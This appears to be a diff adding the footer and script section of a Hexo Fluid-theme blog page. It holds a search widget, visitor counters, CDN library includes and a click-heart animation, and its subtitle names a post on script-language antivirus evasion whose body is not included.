+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <!-- <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div> -->
+    
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "免杀二-脚本语言免杀&nbsp;",
+      ],
+      cursorChar: "",
+      typeSpeed: 100,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+  
+  
+    <script>
+      !function (e, t, a) {
+        function r() {
+          for (var e = 0; e < s.length; e++) s[e].alpha <= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = "left:" + s[e].x + "px;top:" + s[e].y + "px;opacity:" + s[e].alpha + ";transform:scale(" + s[e].scale + "," + s[e].scale + ") rotate(45deg);background:" + s[e].color + ";z-index:99999");
+          requestAnimationFrame(r)
+        }
+
+        function n() {
+          var t = "function" == typeof e.onclick && e.onclick;
+          e.onclick = function (e) {
+            t && t(), o(e)
+          }
+        }
+
+        function o(e) {
+          var a = t.createElement("div");
+          a.className = "heart", s.push({
+            el: a,
+            x: e.clientX - 5,
+            y: e.clientY - 5,
+            scale: 1,
+            alpha: 1,
+            color: c()
+          }), t.body.appendChild(a)
+        }
+
+        function i(e) {
+          var a = t.createElement("style");
+          a.type = "text/css";
+          try {
+            a.appendChild(t.createTextNode(e))
+          } catch (t) {
+            a.styleSheet.cssText = e
+          }
+          t.getElementsByTagName("head")[0].appendChild(a)
+        }
+
+        function c() {
+          return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+        }
+
+        var s = [];
+        e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) {
+          setTimeout(e, 1e3 / 60)
+        }, i(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"), n(), r()
+      }(window, document);
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
